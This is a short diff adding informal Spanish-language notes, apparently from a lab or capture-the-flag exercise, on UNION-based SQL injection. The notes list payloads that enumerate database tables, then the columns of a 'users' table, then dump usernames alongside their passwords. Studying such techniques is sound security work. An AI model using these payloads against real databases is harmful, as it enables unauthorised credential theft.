@@ -1,0 +1,14 @@
+hacemos la misma papa
+
+' UNION SELECT NULL, table_name FROM information_schema.tables -- -
+encontramos users
+
+el valor que esta en null cabe aclarar que no lo podemos usar asi que vamos a seleccionar ambas tablas a la vez usando union
+
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- -
+
+aunque acabo de encontrar una manera mejor asi
+
+' UNION SELECT NULL, username||'->'||password FROM users -- -
+
+lo que hace eso es escribir texto entre ambos para separar y nada de ahi sacamos el user y su password correspondiente
